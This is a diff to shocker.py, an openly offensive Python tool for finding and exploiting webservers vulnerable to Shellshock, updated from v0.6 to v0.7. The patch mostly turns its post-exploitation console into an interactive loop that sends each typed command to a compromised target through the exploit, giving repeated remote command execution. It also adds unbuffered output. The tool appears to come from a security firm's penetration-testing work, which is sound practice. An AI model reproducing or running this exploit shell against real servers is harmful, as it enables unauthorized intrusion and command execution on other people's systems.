@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 """
-shocker.py v0.6
+shocker.py v0.7
 A tool to find and exploit webservers vulnerable to Shellshock
 
 ##############################################################################
@@ -42,6 +42,20 @@ import Queue
 import threading
 import re
 from collections import OrderedDict
+
+# Wrapper object for sys.sdout to elimate buffering
+# (http://stackoverflow.com/questions/107705/python-output-buffering)
+class Unbuffered(object):
+    def __init__(self, stream):
+        self.stream = stream
+    def write(self, data):
+        self.stream.write(data)
+        self.stream.flush()
+    def __getattr__(self, attr):
+        return getattr(self.stream, attr)
+
+# Wrap std.out in Unbuffered
+sys.stdout = Unbuffered(sys.stdout)
 
 # User-agent to use instead of 'Python-urllib/2.6' or similar
 user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
@@ -232,29 +246,53 @@ def ask_for_console(proxy, successful_targets, verbose):
     
     while user_input is not 0:
         result = ""
-        print "[+] The following URLs appeared to be exploitable:"
-        for x in range(len(successful_targets)):
-            print "  [%i] %s" % (x+1, ordered_url_list[x-1])
-        print "[+] Would you like exploit further?"
-        user_input = raw_input("[?] Enter an URL number or 0 to exit: ")
+        print "[+] The following URLs appear to be exploitable:"
+        for x in range(len(ordered_url_list)):
+            print "  [%i] %s" % (x+1, ordered_url_list[x])
+        print "[+] Would you like to exploit further?"
+        user_input = raw_input("[>] Enter an URL number or 0 to exit: ")
+        sys.stdout.flush()
         try:
             user_input = int(user_input)
         except:
             continue
         if user_input not in range(len(successful_targets)+1):
-            print "[-] Please enter a number between 0 and %i" % len(successful_targets)
+            print "[-] Please enter a number between 1 and %i (0 to exit)" % \
+                                                            len(successful_targets)
             continue
         elif not user_input:
             continue
         target = ordered_url_list[user_input-1]
         header = successful_targets[target][0]
-        command = raw_input("[+] Enter command to run: ")
-        if command:
-            attack = successful_targets[target][1] + command
-            result = do_attack(proxy, target, header, attack, verbose)
-        else:
-            print "[-] No command entered"
-        print result
+        print "[+] Entering interactive mode..."
+        print "  Enter commands, or 'quit'"
+
+        while True:
+            command = ""
+            result = ""
+            sys.stdout.flush()
+            command = raw_input(" > ")
+            sys.stdout.flush()
+            if command == "quit":
+                sys.stdout.flush()
+                print "[+] Exiting interactive mode..."
+                sys.stdout.flush()
+                break
+            if command:
+                attack = successful_targets[target][1] + command
+                result = do_attack(proxy, target, header, attack, verbose)
+            else:
+                result = ""
+            if result: 
+                buf = StringIO.StringIO(result)
+                for line in buf:
+                    sys.stdout.flush()
+                    print " > %s" % line.strip()
+                    sys.stdout.flush()
+            else:
+                sys.stdout.flush()
+                print " > No response"
+                sys.stdout.flush()
 
 
 def validate_address(hostaddress):
@@ -303,7 +341,7 @@ def main():
   (   )|            |            
    `-. |--. .-.  .-.|.-. .-. .--.
   (   )|  |(   )(   |-.'(.-' |   
-   `-' '  `-`-'  `-''  `-`--''  v0.6 
+   `-' '  `-`-'  `-''  `-`--''  v0.7 
    
  Tom Watson, tom.watson@nccgroup.com
  http://www.github.com/nccgroup/shocker
@@ -429,8 +467,9 @@ def main():
         if len(successful_targets):
             ask_for_console(proxy, successful_targets, verbose)
     else:
-        print "[+] No potential targets found :("
-    print "[+] The end"
+        print "[+] No targets found to exploit"
 
+
+__version__ = '0.7'
 if __name__ == '__main__':
     main()
